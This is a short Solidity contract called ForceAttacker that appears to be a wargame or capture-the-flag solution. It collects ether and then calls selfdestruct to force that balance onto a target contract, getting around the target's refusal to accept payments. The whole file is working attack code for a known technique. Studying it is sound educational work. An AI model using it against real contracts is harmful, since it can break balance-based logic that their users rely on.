pragma solidity ^0.6.0;

contract ForceAttacker {

    address payable target;
    uint balance;

    constructor(address payable  _to) payable public {

        target = _to;
    }

    function deposit() public payable {
        balance = balance + msg.value;
    }

    function sendAttack() public payable {

        selfdestruct(target);
    }
}